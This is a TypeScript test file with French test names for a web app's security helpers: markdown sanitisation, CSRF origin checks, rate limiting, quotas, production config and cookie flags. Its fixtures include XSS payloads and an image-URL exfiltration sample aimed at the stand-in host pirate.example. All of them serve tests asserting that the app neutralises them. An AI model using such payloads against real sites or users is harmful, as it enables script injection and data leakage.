import assert from "node:assert/strict";
import { afterEach, test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { configProblems, sessionCookieOptions } from "../src/lib/env.ts";
import { markdownOptions } from "../src/lib/markdown-config.ts";
import { isSameOriginRequest } from "../src/lib/origin.ts";
import { QuotaError, quotaErrorFromMessage } from "../src/lib/quota.ts";
import { clientIp, rateLimit, resetRateLimits } from "../src/lib/rate-limit.ts";

const render = (md: string) => renderToStaticMarkup(createElement(ReactMarkdown, markdownOptions, md));

// ───────── rendu markdown : exfiltration et injection ─────────
test("markdown : aucune image n'est rendue (anti-exfiltration par URL d'image)", () => {
  const html = render("Texte ![pixel](https://pirate.example/?d=cv-secret) fin");
  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /pirate\.example/);
  assert.match(html, /Texte/);
});

test("markdown : le HTML brut n'est jamais interprété", () => {
  const html = render('<script>alert(1)</script><img src=x onerror=alert(1)><iframe src="//x"></iframe>');
  assert.doesNotMatch(html, /<script/i);
  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /<iframe/i);
});

test("markdown : les liens javascript: sont neutralisés, les liens normaux durcis", () => {
  const bad = render("[clic](javascript:alert(1))");
  assert.doesNotMatch(bad, /javascript:/i);
  const ok = render("[site](https://example.com)");
  assert.match(ok, /href="https:\/\/example\.com"/);
  assert.match(ok, /rel="noopener noreferrer nofollow"/);
  assert.match(ok, /target="_blank"/);
});

test("markdown : les tableaux restent rendus", () => {
  assert.match(render("| a | b |\n|---|---|\n| 1 | 2 |"), /<table>/);
});

// ───────── CSRF ─────────
test("origine : accepte same-origin et l'Origin du site, refuse le reste", () => {
  const h = (o: Record<string, string>) => ({ get: (k: string) => o[k.toLowerCase()] ?? null });
  const site = "https://jobs.example.com";
  assert.equal(isSameOriginRequest(h({ "sec-fetch-site": "same-origin" }), site), true);
  assert.equal(isSameOriginRequest(h({ origin: "https://jobs.example.com" }), site), true);
  assert.equal(isSameOriginRequest(h({ "sec-fetch-site": "cross-site", origin: "https://jobs.example.com" }), site), false);
  assert.equal(isSameOriginRequest(h({ origin: "https://evil.example" }), site), false);
  assert.equal(isSameOriginRequest(h({}), site), false);
  assert.equal(isSameOriginRequest(h({ origin: "pas une url" }), site), false);
});

// ───────── limiteur ─────────
test("rateLimit : bloque au-delà du maximum puis libère après la fenêtre", () => {
  resetRateLimits();
  const t0 = 1_000_000;
  for (let i = 0; i < 3; i++) assert.equal(rateLimit("k", 3, 60_000, t0 + i).ok, true);
  const blocked = rateLimit("k", 3, 60_000, t0 + 10);
  assert.equal(blocked.ok, false);
  assert.ok(blocked.retryAfterSec >= 1);
  assert.equal(rateLimit("autre", 3, 60_000, t0 + 10).ok, true); // clés indépendantes
  assert.equal(rateLimit("k", 3, 60_000, t0 + 61_000).ok, true); // fenêtre écoulée
});

test("clientIp : premier élément de X-Forwarded-For", () => {
  const h = (o: Record<string, string>) => ({ get: (k: string) => o[k.toLowerCase()] ?? null });
  assert.equal(clientIp(h({ "x-forwarded-for": "203.0.113.9, 10.0.0.1" })), "203.0.113.9");
  assert.equal(clientIp(h({ "x-real-ip": "198.51.100.2" })), "198.51.100.2");
  assert.equal(clientIp(h({})), "unknown");
});

// ───────── quotas : traduction des erreurs SQL ─────────
test("quotaErrorFromMessage", () => {
  assert.ok(quotaErrorFromMessage("ERROR: quota:concurrent") instanceof QuotaError);
  assert.equal(quotaErrorFromMessage("quota:user_daily", 7)?.message.includes("7 analyses"), true);
  assert.equal(quotaErrorFromMessage("quota:global_daily")?.code, "global_daily");
  assert.equal(quotaErrorFromMessage("autre erreur"), null);
});

// ───────── configuration « échoue fermé » en production ─────────
const KEYS = ["NODE_ENV", "SITE_URL", "NEXT_PUBLIC_SITE_URL", "ALLOWED_EMAILS", "ALLOW_ANY_SUPABASE_USER", "SUPABASE_URL", "SUPABASE_PUBLISHABLE_KEY", "SUPABASE_SERVICE_ROLE_KEY", "ANTHROPIC_API_KEY"];
const saved = Object.fromEntries(KEYS.map((k) => [k, process.env[k]]));
afterEach(() => {
  for (const k of KEYS) {
    if (saved[k] === undefined) delete process.env[k];
    else process.env[k] = saved[k];
  }
});
function prodBase() {
  for (const k of KEYS) delete process.env[k];
  Object.assign(process.env, { NODE_ENV: "production", SUPABASE_URL: "https://x.supabase.co", SUPABASE_PUBLISHABLE_KEY: "p", SUPABASE_SERVICE_ROLE_KEY: "s", ANTHROPIC_API_KEY: "k" });
}

test("production : refuse de démarrer sans SITE_URL https et sans ALLOWED_EMAILS", () => {
  prodBase();
  assert.deepEqual(configProblems().map((p) => p.split(" ")[0]), ["SITE_URL", "ALLOWED_EMAILS"]);
  process.env.SITE_URL = "http://jobs.example.com";
  assert.ok(configProblems().some((p) => p.includes("https://")));
  process.env.SITE_URL = "https://jobs.example.com";
  process.env.ALLOWED_EMAILS = "a@b.fr";
  assert.deepEqual(configProblems(), []);
});

test("production : ALLOW_ANY_SUPABASE_USER=1 lève l'exigence ; localhost en http toléré", () => {
  prodBase();
  process.env.SITE_URL = "http://localhost:3000";
  process.env.ALLOW_ANY_SUPABASE_USER = "1";
  assert.deepEqual(configProblems(), []);
});

test("hors production : pas d'exigence supplémentaire", () => {
  prodBase();
  (process.env as Record<string, string | undefined>).NODE_ENV = "development";
  assert.deepEqual(configProblems(), []);
});

test("cookies de session : httpOnly, sameSite=lax, secure seulement en https", () => {
  process.env.SITE_URL = "https://jobs.example.com";
  assert.deepEqual(sessionCookieOptions(), { httpOnly: true, secure: true, sameSite: "lax", path: "/" });
  process.env.SITE_URL = "http://localhost:3000";
  assert.equal(sessionCookieOptions().secure, false);
  assert.equal(sessionCookieOptions().httpOnly, true);
});
